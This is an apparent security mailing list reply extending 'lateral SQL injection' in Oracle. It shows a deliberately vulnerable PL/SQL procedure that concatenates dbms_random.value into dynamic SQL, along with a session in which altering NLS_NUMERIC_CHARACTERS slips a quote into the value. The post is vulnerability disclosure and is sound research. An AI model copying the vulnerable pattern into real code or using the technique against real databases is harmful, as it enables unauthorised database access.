Subject: Re: Lateral SQL Injection Revisited - No Special Privs Required

Great work David! as usual ) 

I just can add a little info 

Not only sysdate function can be used in procedure without input parametres.

For example using  dbms_random.value in procedure without input parameters, we also can  inject sql code.

---------------------------

vunerable procedure:

create or replace procedure sh2kerr_num_proc is 
stmt varchar2(2000); 
n number:=dbms_random.value;
begin 
stmt:='select object_name from all_objects where object_id = ' || n; 
execute immediate stmt; 
end; 
/




--------------
TEST:


SQL> ALTER SESSION SET NLS_NUMERIC_CHARACTERS = '''.' ;
Session altered.

SQL> select dbms_random.value from dual;
     VALUE
----------
'763871688
SQL> exec sh2kerr_num_proc
BEGIN sh2kerr_num_proc; END;

*
ERROR at line 1:
ORA-01756: quoted string not properly terminated
--------------------------


Thats all.Thanks.
